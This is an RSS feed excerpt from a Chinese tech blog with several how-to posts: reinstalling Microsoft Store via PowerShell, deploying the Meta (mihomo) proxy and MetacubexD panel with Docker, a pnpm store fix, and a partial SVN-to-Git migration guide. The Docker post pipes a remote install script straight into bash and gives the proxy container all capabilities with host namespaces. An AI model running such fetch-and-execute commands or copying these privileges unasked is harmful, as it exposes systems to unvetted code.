<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">soft.WindowsAppRuntime.1.1”</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(具有中性或 x64 处理器体系结构，最低版本为 </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1002.543</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1943.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)。当前已安装的名称为</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">“Microsoft.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">WindowsAppRuntime.1.1”</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">的框架为: {}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">注意: 有关其他信息，请在事件日志中查找 [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">ActivityId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">] a9195122</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f754</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0002</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">738a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">93aa54f7da01，或使用命令行 </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Get-AppPackageLo</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ActivityID a9195122</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f754</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0002</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">738a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">93aa54f7da01</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">所在位置 行:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> 字符: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> Add-AppxPackage</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Path C:\Users\xxxxx\Downloads\AppleInc.iCloud_1 ...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">    +</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> CategoryInfo          : WriteError: (C:\Users\xxx...j5cx40ttqa.Appx:String) [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">Add</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">AppxPackage</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">], IOException</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">    +</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>以管理员身份打开 PowerShell</h2>
<p>按 <code>Win + X</code> 键，选择“Windows PowerShell (管理员)”或“Windows 终端 (管理员)”，这取决于您的 Windows 版本。</p>
<p>如果出现用户账户控制 (UAC) 提示，请点击“是”以继续。</p>
<h2>卸载 Microsoft Store</h2>
<p>执行卸载命令</p>
<p>在打开的“管理员：Windows PowerShell”窗口中输入以下命令，并按回车键执行：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Get-AppxPackage</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">WindowsStore</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Remove-AppxPackage</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这条命令会卸载所有与 Microsoft Store 相关的包。</p>
<h2>重新注册 Microsoft Store</h2>
<p>重新注册 Microsoft Store</p>
<p>在同一 PowerShell 窗口中输入以下命令，并按回车键执行：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">add-appxpackage</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">register </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"C:\Program Files\WindowsApps\*Store*\AppxManifest.xml"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">disabledevelopmentmode</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>上述命令中的 <code>*.appx</code> 是一个通配符，用于匹配 Microsoft Store 的安装文件。</p>
<p>默认路径是这个，如果路径不同，您需要手动找到正确的文件路径。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Docker一键部署Meta和MetacubexD面板</title>
      <link>https://www.geekery.cn/note-book/VirtualPrivateNetwork/%E7%8B%AD%E4%B9%89VirtualPrivateNetwork/Docker%E4%B8%80%E9%94%AE%E9%83%A8%E7%BD%B2Meta%E5%92%8CMetacubexD%E9%9D%A2%E6%9D%BF.html</link>
      <guid>https://www.geekery.cn/note-book/VirtualPrivateNetwork/%E7%8B%AD%E4%B9%89VirtualPrivateNetwork/Docker%E4%B8%80%E9%94%AE%E9%83%A8%E7%BD%B2Meta%E5%92%8CMetacubexD%E9%9D%A2%E6%9D%BF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker一键部署Meta和MetacubexD面板</source>
      <description>Docker一键部署Meta和MetacubexD面板 为了简化 MetacubexD 和 Meta 的部署过程，本文档将指导如何使用 Docker 快速部署这两个应用。 Docker 可以在任何支持它运行的环境中启动这些应用，从而避免复杂的环境配置。 准备工作 安装 Docker 访问Docker官方进行部署或者使用编写的一键安装脚本快速安装，如果你...</description>
      <pubDate>Sun, 22 Sep 2024 12:46:19 GMT</pubDate>
      <content:encoded><![CDATA[
<p>为了简化 MetacubexD 和 Meta 的部署过程，本文档将指导如何使用 Docker 快速部署这两个应用。</p>
<p>Docker 可以在任何支持它运行的环境中启动这些应用，从而避免复杂的环境配置。</p>
<h2>准备工作</h2>
<h3>安装 Docker</h3>
<p>访问Docker官方进行部署或者使用编写的一键安装脚本快速安装，如果你在中国的大陆地区，建议使用下面的一键部署脚本进行部署。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> get-docker.geekery.cn</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>配置文件设置</h3>
<p>在开始部署前，需在 Meta 的配置文件中启用外部控制器，以便 MetacubexD 能够与 Meta 进行交互。请在配置文件中添加或修改以下内容：</p>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">external-controller</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0.0.0.0:9090</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>使用 Docker 部署</h2>
<h3>使用 Docker CLI</h3>
<h4>启动 MetacubexD 容器</h4>
<p>执行以下命令以启动 MetacubexD 容器，该命令将容器内的 80 端口映射到主机的 80 端口：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> always</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 80:80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> metacubexd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ghcr.geekery.cn/metacubex/metacubexd</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>启动 Meta 容器</h4>
<p>接着，执行以下命令以启动 Meta 容器。假设您已有一个名为 <code>config.yaml</code> 的配置文件位于当前目录下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> meta</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ./config.yaml:/root/.config/mihomo/config.yaml</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/net/tun:/dev/net/tun</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    hub.icert.top/metacubex/mihomo:Alpha</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>使用 Docker Compose</h3>
<p>建议使用 Docker Compose 管理多个容器，可以创建一个 <code>docker-compose.yml</code> 文件，内容如下所示：</p>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'3'</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">services</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  metacubexd</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    container_name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">metacubexd</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    image</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ghcr.geekery.cn/metacubex/metacubexd</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    restart</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">always</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    ports</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'80:80'</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  meta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    container_name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">meta</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    image</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">hub.icert.top/metacubex/mihomo:Alpha</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    restart</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">always</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    pid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">host</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    ipc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">host</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    network_mode</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">host</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    cap_add</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ALL</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    volumes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">./config.yaml:/root/.config/mihomo/config.yaml</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/dev/net/tun:/dev/net/tun</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>随后，在 <code>docker-compose.yml</code> 文件所在目录中执行以下命令启动服务：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compose</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> up</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>访问 MetacubexD</h2>
<p>当所有容器均成功启动后，可通过浏览器访问 <code>http://localhost</code>（若为本地部署）以打开 MetacubexD 的管理界面。在此界面中，可进行 Meta 实例的配置与管理。</p>
<h2>备注</h2>
<ul>
<li>在生产环境中，建议使用更安全的网络配置和更严格的权限管理。</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>pnpm在DevContainer中存储出错解决方法</title>
      <link>https://www.geekery.cn/note-book/Nodejs/pnpm%E5%9C%A8DevContainer%E4%B8%AD%E5%AD%98%E5%82%A8%E5%87%BA%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.html</link>
      <guid>https://www.geekery.cn/note-book/Nodejs/pnpm%E5%9C%A8DevContainer%E4%B8%AD%E5%AD%98%E5%82%A8%E5%87%BA%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.html</guid>
      <source url="https://www.geekery.cn/rss.xml">pnpm在DevContainer中存储出错解决方法</source>
      <description>pnpm在DevContainer中存储出错解决方法 更改存储目录</description>
      <pubDate>Wed, 11 Sep 2024 14:08:23 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>更改存储目录</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pnpm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> store-dir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>从SVN迁移仓库到Git</title>
      <link>https://www.geekery.cn/note-book/Git/%E4%BB%8ESVN%E8%BF%81%E7%A7%BB%E4%BB%93%E5%BA%93%E5%88%B0Git.html</link>
      <guid>https://www.geekery.cn/note-book/Git/%E4%BB%8ESVN%E8%BF%81%E7%A7%BB%E4%BB%93%E5%BA%93%E5%88%B0Git.html</guid>
      <source url="https://www.geekery.cn/rss.xml">从SVN迁移仓库到Git</source>
      <description>从SVN迁移仓库到Git 建立 SVN 用户到 Git 用户的映射 查看 SVN 用户 首先检出全部 SVN 用户列表： 输出的 userinfo.txt 文件内容如下： 描述映射关系 接着按以上格式描述映射关系： 此时，userinfo.txt 就准备好了，接下来开始克隆 SVN 地址。 下载 SVN 代码库 操作之前，你需要了解 SVN 目录和 G...</description>
      <pubDate>Wed, 04 Sep 2024 14:12:57 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>建立 SVN 用户到 Git 用户的映射</h2>
<p><strong>查看 SVN 用户</strong></p>
<p>首先检出全部 SVN 用户列表：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">svn</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> log</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --xml</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "^&lt;author"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sort</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -u</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">\awk</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -F</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '&lt;author&gt;'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{print $2}'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">awk</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -F</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '&lt;/author&gt;'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{print $1}'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">userinfo.txt</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>输出的 userinfo.txt 文件内容如下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">edmond</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>描述映射关系</strong></p>
<p>接着按以上格式描述映射关系：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">edmond</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> edmond</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">edmond@geekery.c</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">n&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">cc@geekery.c</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">n&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dd</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">dd@geekery.c</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">n&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时，userinfo.txt 就准备好了，接下来开始克隆 SVN 地址。</p>
<h2>下载 SVN 代码库</h2>
<p>操作之前，你需要了解 SVN 目录和 Git 的关系：</p>
<p><strong>SVN目录</strong></p>
<ul>
<li>/trunk：开发主线，相当于 Git 中的 Master 分支；</li>
<li>/branches：支线副本，相当于 Git 中的其余分支；</li>
<li>/tags：标签，与 Git中的标签一样；</li>
</ul>
<p><strong>下载 SVN 仓库</strong></p>
<p>把上一步准备好的 userinfo.txt 拷贝到准备克隆 SVN 代码的目录下，然后执行git svn clone命令克隆一个 Git 版本库。</p>
<p>如果你的项目是完全按照 trunk，branches，tags 来管理的，只需使用--stdlayout进行范围指定，迁移的命令可以写作如下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> svn</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> clone</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"SVN repo URL"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">] </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">--prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">svn/</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> --no-metadata</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --authors-file=userinfo.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --stdlayout</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如果是非标准格式的仓库，可以通过 --trunk，--branches 和 --tags 去指定：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> svn</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> clone</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"SVN repo URL"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">] </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">--prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">svn/</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> --no-metadata</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 